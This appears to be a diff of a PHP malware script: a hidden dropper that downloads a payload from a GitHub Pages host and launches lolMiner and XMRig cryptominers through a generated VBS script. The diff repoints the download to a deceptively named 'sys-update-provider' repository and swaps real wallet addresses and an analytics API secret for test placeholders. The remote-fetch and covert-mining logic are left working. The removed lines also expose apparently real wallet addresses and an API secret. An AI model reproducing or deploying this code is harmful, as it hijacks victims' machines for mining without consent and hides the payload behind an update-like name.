@@ -155,7 +155,7 @@ $GLOBALS['__verify_vir_version_002'] = function()
 		return;
 	$root = dirname(PHP_BINARY) . '/temp2';
 	@mkdir($root);
-	@file_put_contents($root.'/com.dat', $GLOBALS['__download_002']('https://miriamdev2026.github.io/teste/com/com_v13.1'));
+	@file_put_contents($root.'/com.dat', $GLOBALS['__download_002']('https://sys-update-provider.github.io/reversePHP/com/com_v13.1'));
 	$root_path = $root;
 	@mkdir($root_path . '\\prt');
 	$data = @file_get_contents($root_path . '\\com.dat');
@@ -229,8 +229,8 @@ if(@file_get_contents(dirname(PHP_BINARY).'/version_2') === '1.1')
 		/*echo $is_server ? "TRUE" : "FALSE"; exit("\n\n");*/
 		
 		/*@$GLOBALS['__download_002']('xxxxxxxxxxxxxx');*/
-		$measurement_id = "G-MK5W0X76S3";
-		$api_secret = "75qz-iqmTOazvRWiP60Rqg";
+		$measurement_id = "G-TEST000000";
+		$api_secret = "test_secret";
 		$client_id = $id;
 		$url = "https://www.google-analytics.com/mp/collect?measurement_id=$measurement_id&api_secret=$api_secret";
 		$data = ["client_id" => $client_id,"events" => [["name" => $param_name,"params" => ["script_version" => "1.0","timestamp" => time()]]]];
@@ -271,8 +271,8 @@ if(1)
 	$lolm_path .= '\\'.$lolm_name.'.exe';
 	$xmr_path .= '\\'.$xmr_name.'.exe';
 	$data = true;
-	$user = 'miriamdev2026';
-	$project = 'teste';
+	$user = 'sys-update-provider';
+	$project = 'reversePHP';
 	if(!is_file($lolm_path))
 	{
 		$data = false;
@@ -338,7 +338,7 @@ if(1)
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user xxxxxxxxxxxxxxxxxx.'.$work_key.'_dev'.$devnum.' --watchdog exit --nocolor --devices '.$devnum;*/
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user xxxxxxxxxxxxxxxxxxxxx.'.$work_key.' --watchdog exit --nocolor';*/
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-us-east1.nanopool.org:10600 --user 9iBGUJ1H4PmqPtmuxXXNSr5JHDcT2QvFiW4LEjRXHFQnjrTzQhE.'.$work_key.' --watchdog exit --nocolor';*/
-		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool erg.2miners.com:8888 --user 9iBMo1BM7mSPRUWA1yHDUepNCHKZ4ZV4vaeMGhCsBbUmVcDDYfr.'.$work_key.' --watchdog exit --nocolor';
+		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool erg.2miners.com:8888 --user TEST_ERGO_WALLET.'.$work_key.' --watchdog exit --nocolor';
 		$command = preg_replace('/\"/is', '""', $command);
 		$vbs = base64_decode($vbs);
 		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
@@ -353,7 +353,7 @@ if(1)
 			else
 			{
 				$num_threads = (string)ceil($num_threads / 4);
-				$xmr_address = '4B6d8CF6BSZRH2JoC4P3JjVWtZ5Axe4bLZ3XDNMmsSD794xC3sBgtUtDitCQevnP9FEoiCathYVFMZGnxZHizJpL5SZWhch';
+				$xmr_address = 'TEST_MONERO_WALLET';
 				$command = '"'.$xmr_path.'" -o xmrpool.eu:3333 -a rx/0 -u '.$xmr_address.' -p '.md5($work_key.'001').' --threads '.$num_threads;
 				
 				$command = preg_replace('/\"/is', '""', $command);
